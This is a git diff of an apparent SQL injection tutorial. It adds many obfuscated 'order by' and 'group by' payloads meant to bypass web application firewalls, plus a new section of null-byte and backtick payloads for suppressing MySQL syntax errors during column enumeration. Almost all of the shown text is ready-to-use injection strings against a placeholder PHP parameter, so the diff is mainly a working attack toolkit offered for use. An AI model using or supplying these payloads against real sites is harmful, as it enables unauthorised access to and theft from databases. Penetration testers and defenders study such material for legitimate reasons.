@@ -71,24 +71,45 @@ This query musn't shows up error, since there is no lower number than 1
  These both queries musn't shows up error. If error is still ocurring, try the following payloads:
 
     - If both of payloads don't work, it is problably a WAF blocking it. Try the following blocks until you won't see WAF detection or SQL syntax error.  
-```http://domain.com/index.php?id=1' order by 1 desc-- -```  
-```http://domain.com/index.php?id=1' group by 1-- -```  
-```http://domain.com/index.php?id=1' group by 1-- -```  
-```http://domain.com/index.php?id=1' /**/ORDER/**/BY/**/ 1-- -```  
-```http://domain.com/index.php?id=-1' /*!order*/+/*!by*/ 1-- -```  
-```http://domain.com/index.php?id=1' /*!ORDER BY*/ 1-- -```  
-```http://domain.com/index.php?id=1'/*!50000ORDER*//**//*!50000BY*/ 1-- -```  
-```http://domain.com/index.php?id=1' /*!12345ORDER*/+/*!BY*/ 1-- -```  
-```http://domain.com/index.php?id=1' /*!50000ORDER BY*/ 1-- -```  
-```http://domain.com/index.php?id=1' order/**_**/by 1-- -```  
-```http://domain.com/index.php?id=1\ order by 1-- -```  
-```http://domain.com/index.php?id=1' order by 1 asc-- -```  
-```http://domain.com/index.php?id=1' group by 1 asc-- -```  
-```http://domain.com/index.php?id=1' AND 0 order by 1-- -```  
+```
+http://domain.com/index.php?id=1' order by 1 desc-- -  
+http://domain.com/index.php?id=1' group by 1-- -  
+http://domain.com/index.php?id=1' group by 1-- -  
+http://domain.com/index.php?id=1' /**/ORDER/**/BY/**/ 1-- -  
+http://domain.com/index.php?id=-1' /*!order*/+/*!by*/ 1-- -  
+http://domain.com/index.php?id=1' /*!ORDER BY*/ 1-- -  
+http://domain.com/index.php?id=1'/*!50000ORDER*//**//*!50000BY*/ 1-- -  
+http://domain.com/index.php?id=1' /*!12345ORDER*/+/*!BY*/ 1-- -  
+http://domain.com/index.php?id=1' /*!50000ORDER BY*/ 1-- -  
+http://domain.com/index.php?id=1' order/**_**/by 1-- -  
+http://domain.com/index.php?id=1\ order by 1-- -  
+http://domain.com/index.php?id=1' order by 1 asc-- -  
+http://domain.com/index.php?id=1' group by 1 asc-- -  
+http://domain.com/index.php?id=1' AND 0 order by 1-- -  
+http://domain.com/index.php?id=1%0Aorder%0Aby%0A1-- -  
+http://domain.com/index.php?id=1%23%0Aorder%23%0Aby%23%0A1-- -  
+http://domain.com/index.php?id=1%23aa%0Aorder%23aa%0Aby%23aa%0A1-- -  
+http://domain.com/index.php?id=1%23xyz%0Aorder%23xyz%0Aby%23xyz%0A1-- -  
+http://domain.com/index.php?id=1%23foo%0D%0Aorder%23foo%0D%0Aby%23foo%0D%0A1-- -  
+http://domain.com/index.php?id=1%23foo*%2F*bar%0D%0Aorder%23foo*%2F*bar%0D%0Aby%23foo*%2F*bar%0D%0A1-- -  
+http://domain.com/index.php?id=1/*!20000%0d%0a+order+by+*/1-- -  
+http://domain.com/index.php?id=1/*!blobblobblob%0d%0a+order+by+*/1-- -  
+http://domain.com/index.php?id=1/*!f****U%0d%0a+order+by+*/1-- -  
+```
+
     
     - If none of the payloads didn't bypass WAF, try again the payloads by following the 2 rules below:
       - Add a minus (-) before 1 (example: ```?id=-1' /**/ORDER/**/BY/**/ 1-- -```)  
       - Remove the quote (') after the parameter value (example: ```?id=1 /**/ORDER/**/BY/**/ 1-- -```)
+
+## Stabilise the error message
+Whenever the website keeps showing up erros on MySQL syntax, it is required to enter queries to fix the error.  
+
+```http://domain.com/index.php?id=1' order by 1;%00-- -```   no error  
+```http://domain.com/index.php?id=1' order by 1;%60-- - ```  no error  
+```http://domain.com/index.php?id=1' order by 1%60-- - ```  no error  
+```http://domain.com/index.php?id=1'%23/* order by 1-- - ```  no error  
+```http://domain.com/index.php?id=1') order by 1-- - ```  no error
 
 In this case, the payload ```?id=1 order by 1-- -``` worked and website loads successfuly. Now it is time to find the correct number of columns. Now let's use the payload that worked, and try increasing the number by 1, untill an error shows up: 
 
@@ -96,7 +117,8 @@ In this case, the payload ```?id=1 order by 1-- -``` worked and website loads su
 ```http://domain.com/index.php?id=1 order by 2-- -```  no error  
 ```http://domain.com/index.php?id=1 order by 3-- -```  no error  
 ```http://domain.com/index.php?id=1 order by 4-- -```  no error  
-```http://domain.com/index.php?id=1 order by 5-- -```  error: ```Unknown column '5' in 'order clause'Unknown column '5' in 'order clause'```  
+```http://domain.com/index.php?id=1 order by 5-- -```  error:   
+```Unknown column '5' in 'order clause'Unknown column '5' in 'order clause'```  
 
 This means there are only 4 columns. Now we have to find which one of these 4 columns have information.  
 
